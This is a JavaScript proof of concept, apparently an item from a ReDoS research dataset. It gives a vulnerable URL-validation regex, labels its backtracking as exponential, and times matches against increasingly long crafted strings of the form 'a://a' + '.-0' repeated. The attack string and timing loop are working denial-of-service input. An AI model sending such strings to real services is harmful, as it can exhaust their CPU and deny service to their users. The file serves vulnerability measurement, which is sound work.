/* 8633
 * ^([a-zA-Z]+)://([a-zA-Z0-9_\-]+)((\.[a-zA-Z0-9_\-]+|[0-9]{1,3})+)\.([a-zA-Z]{2,6}|[0-9]{1,3})((:[0-9]+)?)((/[a-zA-Z0-9_\-,.;=%]*)*)((\?[a-zA-Z0-9_\-,.;=&%]*)?)$
 * EXPONENT
 * nums:3
 * EXPONENT AttackString:"a://a"+".-0"*32+"!1 __EOD(ii2)"
 */
var REGEX = new RegExp("^([a-zA-Z]+)://([a-zA-Z0-9_\-]+)((\.[a-zA-Z0-9_\-]+|[0-9]{1,3})+)\.([a-zA-Z]{2,6}|[0-9]{1,3})((:[0-9]+)?)((/[a-zA-Z0-9_\-,.;=%]*)*)((\?[a-zA-Z0-9_\-,.;=&%]*)?)$")
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = 'a://a' + '.-0'.repeat(i*1) + '!1 __EOD(ii2)'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 1 + ": " + time_cost+" ms")
}